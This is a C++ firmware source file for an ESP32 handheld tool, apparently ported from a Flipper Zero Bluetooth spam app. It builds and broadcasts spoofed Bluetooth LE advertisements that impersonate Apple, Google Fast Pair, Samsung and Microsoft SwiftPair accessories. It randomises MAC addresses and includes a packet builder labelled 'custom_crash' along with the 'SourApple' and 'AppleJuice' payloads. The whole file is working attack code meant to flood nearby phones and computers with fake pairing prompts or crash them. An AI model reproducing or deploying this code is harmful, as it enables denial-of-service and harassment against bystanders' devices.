#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "globals.h"
#include "esp_mac.h"
#include "esp_random.h"
#include <string.h>

#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) ||                              \
    defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) ||                            \
    defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

#include <NimBLEDevice.h>
#include <NimBLEBeacon.h>

#if !defined(LITE_VERSION)
#include "apple_spam.h"
#endif

// ============================================================================
// Spam protocol types
// ============================================================================
enum SpamProtocol {
    SPAM_APPLE_CONTINUITY,
    SPAM_GOOGLE_FASTPAIR,
    SPAM_SAMSUNG,
    SPAM_MICROSOFT,
    SPAM_RANDOM,
    SPAM_CUSTOM,
    SPAM_SOURAPPLE,
    SPAM_APPLEJUICE,
};

// ============================================================================
// Apple Continuity — device models and action types
// Ported from ble_spam.c (Flipper Zero reference)
// ============================================================================
static const uint16_t continuity_pp_models[] = {
    0x0E20, 0x0A20, 0x0055, 0x0030, 0x0220, 0x0F20, 0x1320, 0x1420,
    0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120, 0x0520, 0x0920,
    0x1720, 0x1220, 0x1620,
};

static const uint8_t continuity_na_actions[] = {
    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E, 0x09,
    0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B,
};

// ============================================================================
// Google Fast Pair — 3-byte model codes
// ============================================================================
static const uint32_t fastpair_models[] = {
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x0A0000, 0x00000B, 0x0B0000,
    0x00000D, 0x000007, 0x070000, 0x000009, 0x090000, 0x000048, 0x001000,
    0x00B727, 0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400, 0x1E89A7,
    0x0577B1, 0x05A9BC, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494,
    0x718FA4, 0x0002F0, 0x92BBBD, 0x000006, 0x060000, 0xD446A7, 0x2D7A23,
    0x038B91, 0x02F637, 0x02D886, 0xF00000, 0xF00001, 0xF00201, 0xF00209,
    0xF00205, 0xF00305, 0xF00E97, 0x04ACFC, 0x04AA91, 0x04AFB8, 0x05A963,
    0x05AA91, 0x05C452, 0x05C95C, 0x0602F0, 0x0603F0, 0x1E8B18, 0x1E955B,
    0x06AE20, 0x06C197, 0x06C95C, 0x06D8FC, 0x0744B6, 0x07A41C, 0x07C95C,
    0x07F426, 0x0102F0, 0x054B2D, 0x0660D7, 0x0103F0, 0x0903F0, 0x9ADB11,
    0x8B66AB, 0xD99CA1, 0x77FF67, 0xAA187F, 0xDCE9EA, 0x87B25F, 0x1448C9,
    0x13B39D, 0x7C6CDB, 0x005EF9, 0xE2106F, 0xB37A62, 0x92ADC9,
};

// ============================================================================
// Samsung EasySetup — buds and watch models
// ============================================================================
static const uint32_t samsung_buds_models[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41, 0x3B6D02,
    0xAE063C, 0xB8B905, 0xEAAA17, 0xD30704, 0x9DB006, 0x101F1A, 0x859608,
    0x8E4503, 0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
};

static const uint8_t samsung_watch_models[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A,
    0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0xE4,
    0xE5, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0xEC, 0xEF,
};

// ============================================================================
// Helpers
// ============================================================================
static char randomNameBuffer[32];

static void generateRandomMac(uint8_t *mac) {
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;
}

static const char *generateRandomName(void) {
    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    int len = (esp_random() % 7) + 2;
    if (len > 31) len = 31;
    for (int i = 0; i < len; i++)
        randomNameBuffer[i] = charset[esp_random() % (sizeof(charset) - 1)];
    randomNameBuffer[len] = '\0';
    return randomNameBuffer;
}

static inline size_t array_len(const uint8_t *arr, size_t elem_size, size_t arr_size) {
    (void)arr;
    return arr_size / elem_size;
}

// ============================================================================
// Apple Continuity packet builders
// Ported directly from ble_spam.c — these are the working packet formats
// ============================================================================

static size_t build_continuity_proximity_pair(uint8_t *buf) {
    size_t count = sizeof(continuity_pp_models) / sizeof(continuity_pp_models[0]);
    uint16_t model = continuity_pp_models[esp_random() % count];

    uint8_t prefix;
    if (model == 0x0055 || model == 0x0030)
        prefix = 0x05;
    else
        prefix = (esp_random() % 2) ? 0x07 : 0x01;

    uint8_t color = esp_random() % 16;

    uint8_t i = 0;
    buf[i++] = 30;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x07;
    buf[i++] = 25;

    buf[i++] = prefix;
    buf[i++] = (model >> 8) & 0xFF;
    buf[i++] = model & 0xFF;
    buf[i++] = 0x55;
    buf[i++] = ((esp_random() % 10) << 4) | (esp_random() % 10);
    buf[i++] = ((esp_random() % 8)  << 4) | (esp_random() % 10);
    buf[i++] = esp_random() & 0xFF;
    buf[i++] = color;
    buf[i++] = 0x00;
    esp_fill_random(&buf[i], 16);
    i += 16;

    return i;
}

static size_t build_continuity_nearby_action(uint8_t *buf) {
    size_t count = sizeof(continuity_na_actions) / sizeof(continuity_na_actions[0]);
    uint8_t action = continuity_na_actions[esp_random() % count];

    uint8_t flags = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 10;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F;
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;

    return i;
}

static size_t build_continuity_custom_crash(uint8_t *buf) {
    size_t count = sizeof(continuity_na_actions) / sizeof(continuity_na_actions[0]);
    uint8_t action = continuity_na_actions[esp_random() % count];
    uint8_t flags  = 0xC0;
    if (action == 0x20 && (esp_random() % 2)) flags--;
    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;

    uint8_t i = 0;
    buf[i++] = 16;
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F;
    buf[i++] = 5;
    buf[i++] = flags;
    buf[i++] = action;
    esp_fill_random(&buf[i], 3);
    i += 3;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x10;
    esp_fill_random(&buf[i], 3);
    i += 3;

    return i;
}

static size_t build_apple_continuity_adv(uint8_t *buf) {
    switch (esp_random() % 3) {
        case 0:  return build_continuity_proximity_pair(buf);
        case 1:  return build_continuity_nearby_action(buf);
        default: return build_continuity_custom_crash(buf);
    }
}

// ============================================================================
// Google Fast Pair packet builder
// ============================================================================
static size_t build_fastpair_adv(uint8_t *buf) {
    size_t count = sizeof(fastpair_models) / sizeof(fastpair_models[0]);
    uint32_t model = fastpair_models[esp_random() % count];

    uint8_t i = 0;
    buf[i++] = 3;
    buf[i++] = 0x03;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    buf[i++] = 6;
    buf[i++] = 0x16;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >>  8) & 0xFF;
    buf[i++] = model & 0xFF;
    buf[i++] = 2;
    buf[i++] = 0x0A;
    buf[i++] = (uint8_t)((esp_random() % 120) - 100);

    return i;
}

// ============================================================================
// Samsung EasySetup packet builders
// ============================================================================
static size_t build_samsung_buds_adv(uint8_t *buf) {
    size_t count = sizeof(samsung_buds_models) / sizeof(samsung_buds_models[0]);
    uint32_t model = samsung_buds_models[esp_random() % count];

    uint8_t i = 0;
    buf[i++] = 27;  buf[i++] = 0xFF; buf[i++] = 0x75; buf[i++] = 0x00;
    buf[i++] = 0x42; buf[i++] = 0x09; buf[i++] = 0x81; buf[i++] = 0x02;
    buf[i++] = 0x14; buf[i++] = 0x15; buf[i++] = 0x03; buf[i++] = 0x21;
    buf[i++] = 0x01; buf[i++] = 0x09;
    buf[i++] = (model >> 16) & 0xFF;
    buf[i++] = (model >>  8) & 0xFF;
    buf[i++] = 0x01;
    buf[i++] = model & 0xFF;
    buf[i++] = 0x06; buf[i++] = 0x3C; buf[i++] = 0x94; buf[i++] = 0x8E;
    buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0xC7; buf[i++] = 0x00;
    buf[i++] = 16;  buf[i++] = 0xFF; buf[i++] = 0x75;

    return i;
}

static size_t build_samsung_watch_adv(uint8_t *buf) {
    size_t count = sizeof(samsung_watch_models) / sizeof(samsung_watch_models[0]);
    uint8_t model = samsung_watch_models[esp_random() % count];

    uint8_t i = 0;
    buf[i++] = 14;  buf[i++] = 0xFF; buf[i++] = 0x75; buf[i++] = 0x00;
    buf[i++] = 0x01; buf[i++] = 0x00; buf[i++] = 0x02; buf[i++] = 0x00;
    buf[i++] = 0x01; buf[i++] = 0x01; buf[i++] = 0xFF; buf[i++] = 0x00;
    buf[i++] = 0x00; buf[i++] = 0x43; buf[i++] = model;

    return i;
}

static size_t build_samsung_adv(uint8_t *buf) {
    if (esp_random() % 2)
        return build_samsung_buds_adv(buf);
    else
        return build_samsung_watch_adv(buf);
}

// ============================================================================
// Microsoft SwiftPair packet builder
// ============================================================================
static size_t build_swiftpair_adv(uint8_t *buf, const char *customName) {
    const char *name;
    uint8_t name_len;

    if (customName && strlen(customName) > 0) {
        name = customName;
        name_len = strlen(customName);
    } else {
        name = generateRandomName();
        name_len = strlen(name);
    }

    uint8_t i = 0;
    uint8_t size = 7 + name_len;
    buf[i++] = size - 1;
    buf[i++] = 0xFF;
    buf[i++] = 0x06;
    buf[i++] = 0x00;
    buf[i++] = 0x03;
    buf[i++] = 0x00;
    buf[i++] = 0x80;
    memcpy(&buf[i], name, name_len);
    i += name_len;

    return i;
}

// ============================================================================
// Legacy packet builders (SourApple / AppleJuice)
// ============================================================================
static const uint8_t IOS1[] = {
    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
};
static const uint8_t IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};

static size_t build_sour_apple_adv(uint8_t *buf) {
    const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
    uint8_t i = 0;
    buf[i++] = 16;  buf[i++] = 0xFF; buf[i++] = 0x4C; buf[i++] = 0x00;
    buf[i++] = 0x0F; buf[i++] = 5;   buf[i++] = 0xC1;
    buf[i++] = types[esp_random() % (sizeof(types))];
    esp_fill_random(&buf[i], 3); i += 3;
    buf[i++] = 0x00; buf[i++] = 0x00;
    buf[i++] = 0x10;
    esp_fill_random(&buf[i], 3); i += 3;
    return i;
}

static size_t build_apple_juice_adv(uint8_t *buf) {
    if (esp_random() % 2) {
        buf[0] = 0x1e; buf[1] = 0xff; buf[2] = 0x4c; buf[3] = 0x00;
        buf[4] = 0x07; buf[5] = 0x19; buf[6] = 0x07;
        buf[7] = IOS1[esp_random() % sizeof(IOS1)];
        buf[8] = 0x20; buf[9] = 0x75; buf[10] = 0xaa; buf[11] = 0x30;
        buf[12] = 0x01; buf[13] = 0x00; buf[14] = 0x00; buf[15] = 0x45;
        buf[16] = 0x12; buf[17] = 0x12; buf[18] = 0x12;
        memset(&buf[19], 0x00, 7);
        return 26;
    } else {
        buf[0] = 0x16; buf[1] = 0xff; buf[2] = 0x4c; buf[3] = 0x00;
        buf[4] = 0x04; buf[5] = 0x04; buf[6] = 0x2a;
        memset(&buf[7], 0x00, 4);
        buf[11] = 0x0f; buf[12] = 0x05; buf[13] = 0xc1;
        buf[14] = IOS2[esp_random() % sizeof(IOS2)];
        buf[15] = 0x60; buf[16] = 0x4c; buf[17] = 0x95;
        buf[18] = 0x00; buf[19] = 0x00; buf[20] = 0x10;
        buf[21] = 0x00; buf[22] = 0x00;
        return 23;
    }
}

// ============================================================================
// Local state
// ============================================================================
static TaskHandle_t spam_task_handle = NULL;
static SemaphoreHandle_t spam_exit_sem = NULL;
static volatile bool spam_running = false;
static volatile uint32_t spam_packet_count = 0;
static SpamProtocol spam_current_type = SPAM_APPLE_CONTINUITY;
static String spam_custom_name = "";

static const char *spam_type_name(SpamProtocol type) {
    switch (type) {
        case SPAM_APPLE_CONTINUITY: return "Apple Continuity";
        case SPAM_GOOGLE_FASTPAIR:  return "Google FastPair";
        case SPAM_SAMSUNG:          return "Samsung";
        case SPAM_MICROSOFT:        return "Microsoft SwiftPair";
        case SPAM_RANDOM:           return "Random";
        case SPAM_CUSTOM:           return "Custom";
        case SPAM_SOURAPPLE:        return "SourApple";
        case SPAM_APPLEJUICE:       return "AppleJuice";
        default:                    return "Unknown";
    }
}

// ============================================================================
// Spam task — runs in its own FreeRTOS task with priority 5
// BLE init/deinit is managed by ble_spam_start/stop (main task context)
// The task only starts/stops advertising cycles.
// ============================================================================
static void spam_task(void *arg) {
    (void)arg;

    BLEAdvertising *pAdv = BLEDevice::getAdvertising();

    while (spam_running) {
        pAdv->stop();

        // --- Build packet ---
        uint8_t adv_data[31];
        size_t adv_len = 0;
        bool need_flags = true;

        switch (spam_current_type) {
            case SPAM_APPLE_CONTINUITY:
                adv_len = build_apple_continuity_adv(adv_data);
                need_flags = false;
                break;

            case SPAM_GOOGLE_FASTPAIR:
                adv_len = build_fastpair_adv(adv_data);
                break;

            case SPAM_SAMSUNG:
                adv_len = build_samsung_adv(adv_data);
                break;

            case SPAM_MICROSOFT:
                adv_len = build_swiftpair_adv(adv_data, NULL);
                break;

            case SPAM_CUSTOM: {
                uint8_t buf[31];
                size_t plen = build_swiftpair_adv(buf, spam_custom_name.c_str());
                uint8_t i = 0;
                adv_data[i++] = 2;
                adv_data[i++] = 0x01;
                adv_data[i++] = 0x1A;
                memcpy(&adv_data[i], buf, plen);
                adv_len = i + plen;
                need_flags = false;
                break;
            }

            case SPAM_SOURAPPLE:
                adv_len = build_sour_apple_adv(adv_data);
                need_flags = false;
                break;

            case SPAM_APPLEJUICE:
                adv_len = build_apple_juice_adv(adv_data);
                need_flags = false;
                break;

            case SPAM_RANDOM: {
                uint8_t buf[31];
                size_t plen;
                switch (esp_random() % 5) {
                    case 0:
                        adv_len = build_apple_continuity_adv(adv_data);
                        need_flags = false;
                        break;
                    case 1:
                        adv_len = build_fastpair_adv(adv_data);
                        break;
                    case 2:
                        adv_len = build_samsung_adv(adv_data);
                        break;
                    case 3:
                        adv_len = build_swiftpair_adv(adv_data, NULL);
                        break;
                    case 4:
                        plen = build_swiftpair_adv(buf, generateRandomName());
                        adv_data[0] = 2; adv_data[1] = 0x01; adv_data[2] = 0x1A;
                        memcpy(&adv_data[3], buf, plen);
                        adv_len = 3 + plen;
                        need_flags = false;
                        break;
                }
                break;
            }
        }

        if (adv_len == 0) {
            vTaskDelay(pdMS_TO_TICKS(20));
            continue;
        }

        // --- Set advertisement data ---
        BLEAdvertisementData advertisementData;
        if (need_flags) {
            advertisementData.setFlags(0x1A);
        }
#ifdef NIMBLE_V2_PLUS
        advertisementData.addData(adv_data, adv_len);
#else
        std::vector<uint8_t> dataVector(adv_data, adv_data + adv_len);
        advertisementData.addData(dataVector);
#endif

        pAdv->setAdvertisementData(advertisementData);

        // --- Set advertising interval ---
        bool slow = (spam_current_type == SPAM_APPLE_CONTINUITY ||
                     spam_current_type == SPAM_SOURAPPLE ||
                     spam_current_type == SPAM_APPLEJUICE);
        if (slow) {
            pAdv->setMinInterval(48);
            pAdv->setMaxInterval(64);
        } else {
            pAdv->setMinInterval(32);
            pAdv->setMaxInterval(40);
        }

        // --- Start advertising ---
        pAdv->start();
        spam_packet_count++;

        // --- Wait for advertising window ---
        uint32_t adv_ms = slow ? 200 : ((esp_random() % 50) + 50);
        vTaskDelay(pdMS_TO_TICKS(adv_ms));

        pAdv->stop();

        // --- Idle before next packet ---
        vTaskDelay(pdMS_TO_TICKS(slow ? 15 : 20));
    }

    // Task cleanup
    if (spam_exit_sem != NULL) {
        xSemaphoreGive(spam_exit_sem);
    }
    vTaskDelete(NULL);
}

// ============================================================================
// Public API
// ============================================================================
static void ble_spam_start(SpamProtocol type, const String &customName) {
    // Stop any existing spam
    if (spam_running || spam_task_handle != NULL) {
        spam_running = false;
        if (spam_task_handle != NULL) {
            if (spam_exit_sem != NULL) {
                xSemaphoreTake(spam_exit_sem, pdMS_TO_TICKS(750));
            }
            if (eTaskGetState(spam_task_handle) != eDeleted) {
                vTaskDelete(spam_task_handle);
            }
            spam_task_handle = NULL;
        }
        BLEDevice::deinit();
    }

    // Create exit semaphore
    if (spam_exit_sem == NULL) {
        spam_exit_sem = xSemaphoreCreateBinary();
    }
    if (spam_exit_sem != NULL) {
        xSemaphoreTake(spam_exit_sem, 0);
    }

    // Set random MAC for non-Apple (before BLE init)
    bool is_apple = (type == SPAM_APPLE_CONTINUITY);
    if (!is_apple) {
        uint8_t macAddr[6];
        generateRandomMac(macAddr);
        esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);
    }

    // Initialize BLE (main task context)
    BLEDevice::init("");
    vTaskDelay(pdMS_TO_TICKS(10));
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    // Set state and create task
    spam_current_type = type;
    spam_custom_name = customName;
    spam_packet_count = 0;
    spam_running = true;

    BaseType_t res = xTaskCreate(spam_task, "ble_spam", 4096, NULL, 5, &spam_task_handle);
    if (res != pdPASS) {
        spam_running = false;
        spam_task_handle = NULL;
        BLEDevice::deinit();
        return;
    }

    drawMainBorderWithTitle(spam_type_name(type));
    padprintln("");
    padprintln("Press ESC to stop");
}

static void ble_spam_stop(void) {
    if (!spam_running && spam_task_handle == NULL) return;

    spam_running = false;

    if (spam_task_handle != NULL) {
        bool exited = false;
        if (spam_exit_sem != NULL) {
            exited = (xSemaphoreTake(spam_exit_sem, pdMS_TO_TICKS(750)) == pdTRUE);
        }

        if (!exited && spam_task_handle != NULL) {
            if (eTaskGetState(spam_task_handle) != eDeleted) {
                vTaskDelete(spam_task_handle);
            }
        }
        spam_task_handle = NULL;
    }

    BLEDevice::deinit();
    returnToMenu = true;
}

// ============================================================================
// iBeacon (kept from original implementation)
// ============================================================================
void ibeacon(const char *DeviceName, const char *BEACON_UUID, int ManufacturerId) {
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_iface_mac_addr_set(macAddr, ESP_MAC_BT);

    BLEDevice::init(DeviceName);
    vTaskDelay(5 / portTICK_PERIOD_MS);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

    NimBLEBeacon myBeacon;
    myBeacon.setManufacturerId(0x4c00);
    myBeacon.setMajor(5);
    myBeacon.setMinor(88);
    myBeacon.setSignalPower(0xc5);
    myBeacon.setProximityUUID(BLEUUID(BEACON_UUID));

    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData advertisementData = BLEAdvertisementData();
    advertisementData.setFlags(0x1A);
    advertisementData.setManufacturerData(myBeacon.getData());
    pAdvertising->setAdvertisementData(advertisementData);

    drawMainBorderWithTitle("iBeacon");
    padprintln("");
    padprintln("UUID:" + String(BEACON_UUID));
    padprintln("");
    padprintln("Press Any key to STOP.");

    while (!check(AnyKeyPress)) {
        pAdvertising->start();
        vTaskDelay(20 / portTICK_PERIOD_MS);
        pAdvertising->stop();
        vTaskDelay(5 / portTICK_PERIOD_MS);
    }

    BLEDevice::deinit();
}

// ============================================================================
// aj_adv — main entry point from menu lambdas
// ============================================================================
void aj_adv(int ble_choice) {
    String spamName = "";
    if (ble_choice == 6) {
        spamName = keyboard("", 24, "Name to spam");
        if (spamName == "\x1B") return;
    }
    if (ble_choice == 2) {
        spamName = keyboard("", 24, "Windows Name to spam");
        if (spamName == "\x1B") return;
    }

    SpamProtocol protocol;
    switch (ble_choice) {
#if !defined(LITE_VERSION)
        case 0: startAppleSpam(0); return;
        case 1: startAppleSpam(10); return;
#endif
        case 2:  protocol = SPAM_MICROSOFT; break;
        case 3:  protocol = SPAM_SAMSUNG; break;
        case 4:  protocol = SPAM_GOOGLE_FASTPAIR; break;
        case 5:  protocol = SPAM_RANDOM; break;
        case 6:  protocol = SPAM_CUSTOM; break;
        case 7:  protocol = SPAM_SOURAPPLE; break;
        case 8:  protocol = SPAM_APPLEJUICE; break;
        case 9:  protocol = SPAM_APPLE_CONTINUITY; break;
        default: return;
    }

    ble_spam_start(protocol, spamName);

    while (!check(EscPress)) {
        displayTextLine(String(spam_type_name(protocol)) + "  (" + String(spam_packet_count) + ")");
        delay(50);
    }

    ble_spam_stop();
}

// ============================================================================
// Legacy submenu
// ============================================================================
void legacySubMenu() {
    std::vector<Option> legacyOptions;
    legacyOptions.push_back({"SourApple", []() { aj_adv(7); }});
    legacyOptions.push_back({"AppleJuice", []() { aj_adv(8); }});
    legacyOptions.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(legacyOptions, MENU_TYPE_SUBMENU, "Apple Spam (Legacy)");
}

// ============================================================================
// Main spam menu
// ============================================================================
void spamMenu() {
    std::vector<Option> options;
#if !defined(LITE_VERSION)
    options.push_back({"Apple Spam", [=]() { appleSubMenu(); }});
#endif
    options.push_back({"Apple Continuity", lambdaHelper(aj_adv, 9)});
    options.push_back({"Apple Spam (Legacy)", [=]() { legacySubMenu(); }});
    options.push_back({"Windows Spam", lambdaHelper(aj_adv, 2)});
    options.push_back({"Samsung Spam", lambdaHelper(aj_adv, 3)});
    options.push_back({"Android Spam", lambdaHelper(aj_adv, 4)});
    options.push_back({"Spam All", lambdaHelper(aj_adv, 5)});
    options.push_back({"Spam Custom", lambdaHelper(aj_adv, 6)});
    options.push_back({"Back", []() { returnToMenu = true; }});
    loopOptions(options, MENU_TYPE_SUBMENU, "Bluetooth Spam");
}
